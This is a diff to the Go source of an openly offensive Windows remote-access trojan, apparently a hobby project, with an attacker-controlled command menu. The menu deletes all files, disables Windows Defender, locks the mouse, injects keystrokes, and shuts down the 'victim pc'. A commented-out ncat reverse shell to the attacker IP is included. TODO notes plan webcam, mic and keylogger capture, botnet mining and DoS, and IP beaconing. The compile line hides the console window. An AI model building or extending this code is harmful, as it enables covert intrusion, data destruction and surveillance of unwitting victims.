@@ -1,11 +1,14 @@
 /*
 
- ______     __  __     ______     ______     ______      ______     __  __     ______     __         __
-/\  ___\   /\ \_\ \   /\  __ \   /\  ___\   /\__  _\    /\  ___\   /\ \_\ \   /\  ___\   /\ \       /\ \
-\ \ \__ \  \ \  __ \  \ \ \/\ \  \ \___  \  \/_/\ \/    \ \___  \  \ \  __ \  \ \  __\   \ \ \____  \ \ \____
- \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\    \ \_\     \/\_____\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_____\
-  \/_____/   \/_/\/_/   \/_____/   \/_____/     \/_/      \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_____/
+░▒▓███████▓▒░░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░ 
+░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░ 
+░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓█▓▒ ░▒▓█▓▒░ 
+░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░ 
+░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░ 
+░▒▓█▓▒ ░▒▓█▓▒░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓████████▓▒░ 
 
+-----------------------------------------> retrochorizo@proton.me
 
 */
 
@@ -92,8 +95,6 @@ var (
 	// attackerIP
 	attackerIP string = "192.168.0.22"
 	victimPort int    = 5555
-	filename   string = "ghost_shell.exe"
-	path       string = ""
 )
 
 func handleConnection(conn net.Conn) {
@@ -102,17 +103,27 @@ func handleConnection(conn net.Conn) {
 	reader := bufio.NewReader(conn)
 	fmt.Fprintln(conn, "")
 	fmt.Fprintln(conn, "________________________________________")
-	fmt.Fprintln(conn, "\033[1;31mR3TR0 GH0ST_SHELL V1.5\033[0m")
-	fmt.Fprintln(conn, "Type 'help' for available commands")
-	fmt.Fprintln(conn, "   ___   ____ ______ ___   ___ ")
-	fmt.Fprintln(conn, "  / _ \\ |_  //_  __// _ \\ / _ \\")
-	fmt.Fprintln(conn, " / , _/_/_ <  / /  / , _// // /")
-	fmt.Fprintln(conn, "/_/|_|/____/ /_/  /_/|_| \\___/ ")
+	fmt.Fprintln(conn, "\033[1;31mR3TR0 GH0ST_SHELL_project V1.6\033[0m")
+	fmt.Fprintln(conn, "")
+	fmt.Fprintln(conn, " ▄███████▄     ▄████████    ▄████████  ▄██████▄  ")
+	fmt.Fprintln(conn, "██▀     ▄██   ███    ███   ███    ███ ███    ███ ")
+	fmt.Fprintln(conn, "      ▄███▀   ███    █▀    ███    ███ ███    ███ ")
+	fmt.Fprintln(conn, " ▀█▀▄███▀▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███ ")
+	fmt.Fprintln(conn, "  ▄███▀   ▀ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███ ")
+	fmt.Fprintln(conn, "▄███▀         ███    █▄  ▀███████████ ███    ███ ")
+	fmt.Fprintln(conn, "███▄     ▄█   ███    ███   ███    ███ ███    ███ ")
+	fmt.Fprintln(conn, " ▀████████▀   ██████████   ███    ███  ▀██████▀  ")
+	fmt.Fprintln(conn, "                           ██▀    █▀             ")
+	fmt.Fprintln(conn, "  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ")
+	fmt.Fprintln(conn, "  |T|h|e| |h|a|c|k|e|r| |b|e|s|t| |f|r|i|e|n|d|  ")
+	fmt.Fprintln(conn, "  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ")
+	fmt.Fprintln(conn, "")
+	fmt.Fprintln(conn, "Type \033[1;31m'help'\033[0m for available commands")
 	fmt.Fprintln(conn, "________________________________________")
 	fmt.Fprintln(conn, "")
 
 	for {
-		fmt.Fprint(conn, "Enter your command: ")
+		fmt.Fprint(conn, "Z3R0 >> ")
 
 		message, err := reader.ReadString('\n')
 		if err != nil {
@@ -275,7 +286,7 @@ func handleConnection(conn net.Conn) {
 				fmt.Fprintln(conn, "File deleted successfully")
 			}
 
-		case message == "destroy":
+		case message == "erase":
 			// Exécute la commande "del" pour supprimer tous les fichiers du répertoire courant
 			cmd := exec.Command("cmd", "/c", "del", "*.*")
 
@@ -401,27 +412,27 @@ func handleConnection(conn net.Conn) {
 				// Envoyer "def"
 				kb.SetKeys(keybd_event.VK_D, keybd_event.VK_E, keybd_event.VK_F)
 				kb.Launching()
-				time.Sleep(100 * time.Millisecond)
+				time.Sleep(200 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_ENTER)
 				kb.Launching()
-				time.Sleep(100 * time.Millisecond)
+				time.Sleep(200 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_ENTER)
 				kb.Launching()
-				time.Sleep(100 * time.Millisecond)
+				time.Sleep(200 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
-				time.Sleep(100 * time.Millisecond)
+				time.Sleep(200 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
-				time.Sleep(100 * time.Millisecond)
+				time.Sleep(200 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
-				time.Sleep(100 * time.Millisecond)
+				time.Sleep(200 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
@@ -445,11 +456,15 @@ func handleConnection(conn net.Conn) {
 
 		case message == "migrate":
 			// essaye de migrer le procecuss dans un autre c'est mega chaud ...
+
+			
+		case message == "shell":
+			// eveille beaucoup trop les soupcons
 			/*
-				case message == "shell":
-					exec.Command("ncat", attackerIP, "4444", "-e", "powershell")
-					fmt.Fprintln(conn, "shell opened on windows")
+			exec.Command("ncat", attackerIP, "4444", "-e", "powershell")
+			fmt.Fprintln(conn, "shell opened on windows")
 			*/
+			
 
 		case strings.HasPrefix(message, "set_attacker"):
 			// Diviser la commande en parties pour obtenir la nouvelle adresse IP de l'attaquant
@@ -550,14 +565,18 @@ func handleConnection(conn net.Conn) {
 			mouseScript :=
 				`
 			add-type -AssemblyName System.Windows.Forms
-			$timer = New-Object System.Windows.Forms.Timer
-			$timer.Interval = 1000
-			$timer.add_Tick({
+
+			function mouse_locker {
+
+				while ($true){
 				$cursor = [System.Windows.Forms.Cursor]::Position
 				[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)
 				$cursor = [System.Windows.Forms.Cursor]::Position
-			})
-			$timer.Start()
+				}
+			}
+
+			mouse_locker
+
 			`
 
 			// Écriture du script PowerShell dans un fichier
@@ -715,15 +734,19 @@ func handleConnection(conn net.Conn) {
 			fmt.Fprintln(conn, "\033[1;31mset_dns\033[0m <name> <ip adress>: Try to change the dns (Dosent work)")
 			fmt.Fprintln(conn, "\033[1;31mwindefucker:\033[0m Stop windows defender realtime protection")
 			fmt.Fprintln(conn, "________________________________________")
-			fmt.Fprintln(conn, "\033[1;31mcalcexpress:\033[0m Run calcexpress ( TRY IT o_O )")
-			fmt.Fprintln(conn, "\033[1;31mfolderexpress:\033[0m Run folderexpress")
-			fmt.Fprintln(conn, "\033[1;31mmouselocker:\033[0m Run mouselocker")
+			fmt.Fprintln(conn, "\033[1;31mcalcexpress:\033[0m Run calcexpress (Open a clacultater every time the mouse move )")
+			fmt.Fprintln(conn, "\033[1;31mfolderexpress:\033[0m Run folderexpress (Create a new folder on desktop every 200ms)")
+			fmt.Fprintln(conn, "\033[1;31mmouselocker:\033[0m Run mouselocker (Lock the mouse on 0x 0y)")
 			fmt.Fprintln(conn, "\033[1;31mphub:\033[0m ...")
 			fmt.Fprintln(conn, "________________________________________")
 			fmt.Fprintln(conn, "\033[1;31mshutdown:\033[0m Shutdown the victim pc")
 			fmt.Fprintln(conn, "\033[1;31mmessage\033[0m <text>: Send a message to the victim")
-			fmt.Fprintln(conn, "\033[1;31mget_cam:\033[0m Get webcam stream (Not implemented yet)")
 			fmt.Fprintln(conn, "\033[1;31mkeyboard:\033[0m <key1,key2...>: Send keystrokes")
+			fmt.Fprintln(conn, "________________________________________")	
+			fmt.Fprintln(conn, "\033[1;31mget_screen:\033[0m Get screen stream (Not implemented yet)")
+			fmt.Fprintln(conn, "\033[1;31mget_cam:\033[0m Get webcam stream (Not implemented yet)")
+			fmt.Fprintln(conn, "\033[1;31mget_mic:\033[0m Get microphone stream (Not implemented yet)")
+			fmt.Fprintln(conn, "\033[1;31keylogger:\033[0m Get keyboard stream (Not implemented yet)")
 			fmt.Fprintln(conn, "________________________________________")
 			fmt.Fprintln(conn, "\033[1;31mls:\033[0m List files in the current directory")
 			fmt.Fprintln(conn, "\033[1;31mls_hidden:\033[0m List hidden files")
@@ -734,9 +757,10 @@ func handleConnection(conn net.Conn) {
 			fmt.Fprintln(conn, "\033[1;31mdownload\033[0m <filename>: Download a file")
 			fmt.Fprintln(conn, "\033[1;31mget_file\033[0m <filename>: Upload the file to the attacker server (Dosent work yet)")
 			fmt.Fprintln(conn, "\033[1;31mdelete\033[0m <filename>: Delete a file")
-			fmt.Fprintln(conn, "\033[1;31mdestroy:\033[0m Delete all files in the current directory")
+			fmt.Fprintln(conn, "\033[1;31merase:\033[0m Delete all files in the current directory")
 			fmt.Fprintln(conn, "________________________________________")
 			fmt.Fprintln(conn, "\033[1;31mhelp:\033[0m Display available commands")
+			fmt.Fprintln(conn, "\033[1;31minfo:\033[0m Dispay the description")
 			fmt.Fprintln(conn, "\033[1;31mquit:\033[0m Quit the server (But the server will stay awake)")
 			fmt.Fprintln(conn, "________________________________________")
 			fmt.Fprintln(conn, "________________________________________")
@@ -773,34 +797,51 @@ func main() {
 }
 
 /*
+
 TODO :
-		terminer windefucker (fait)
-		reparer le script mouselocker (fait)
-		ajouter d'autres scripts marrants
-		ajouter un script qui chaque seconde crée un nouveau dossier au bureau
-		set_dns ne fonctionne pas encore
-		message ne fonctionne pas encore non plus (MAJ elle ecrit dans un fichier texte puis l'affiche)
+		- terminer windefucker (il faut trouver le temps optimal pour que ca marche)
+		- reparer le script mouselocker
+		- set_dns ne fonctionne pas encore
+		- message ne fonctionne pas encore non plus (MAJ elle ecrit dans un fichier texte puis l'affiche)
 
-		virus qui a chasue fois que l'utilisateur ecrit je suis ajoute derriere une insulte.
-		faire en sorte que quand personne n'est connecté l'ordi se transforme en zombie
+		- coder la fonctionnalité get_screen
+		- coder la fonctionnalité get_cam
+		- coder la fonctionnalité get_mic
+		- coder la fonctionnalité keylogger
+		- coder info
 
-		BUG : ps sans rien arrete le serveur
+		- ajouter une fonctionnalité qui blackscreen et mute pendant 5 seconde le temps d'executer windefucker
 
-		shell : se fait detecter par windows defender !!!
+		- virus qui a chaque fois que l'utilisateur ecrit "je suis" remplace la suite par une insulte au moment l'envoyer le message
+		- faire en sorte que quand personne n'est connecté l'ordi se transforme en zombie (miner du bitcoin / faire des DOS / utiliser comme vpn ...)
+		- ajouter une fonctionnalité de mise a jour qui telecharge le fichier si il y a une mise a jour et qui l'execute
 
-		changer le nom pour Z3ROo the hacker's best friend
+		-ajouter une fonctionnalité pour communiquer en tcp avec la victime
+		-ajouter une fonctionnalité pour communiquer au micro avec la victime ???
 
-		mettre le projet sur github
+		- BUG : ps sans rien arrete le serveur
+		- shell : se fait detecter par windows defender !!! (peut etre utiliser les touches du clavier pour demarer ncat ???)
 
-		repenser keyboard pour integrer les touches alt, ctrl et win, par exeple win(r) applique r avec win
+		- repenser keyboard pour integrer les touches alt, ctrl et win, par exeple win/r applique r avec la touche win pressé
+
+		- shutdown doit forcer l'arret
+
+		- faire envoyer une alerte au demarage a un serveur de sorte a connaitre l'adresse ip de la victime a chaque fois 
+		qu'elle demarre son ordi et a chaque changement de l'adresse ip
+			* il faut que l'alerte contienne le nom de la victime (user) et son adresse ip
+			* utiliser un rasberry pi zero w comme serveur tcp avec deux ports ouverts 
+			un pour recevoir les alertes et les stocker dans un fichier
+			un deuxieme pour envoyer tout ca a l'attaquant.
+
 */
 
 /*
+
 Dependances :
-		go mod init ghost_shell
-		go mod tidy
-		go get -u github.com/gerifield/keybd_event
-		go get github.com/gerifield/keybd_event
+		1)go mod init ghost_shell
+		2)go mod tidy
+		3)go get -u github.com/gerifield/keybd_event
+		4)go get github.com/gerifield/keybd_event
 
 Compilation :
 		GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui -o gs.exe ghost_shell.go
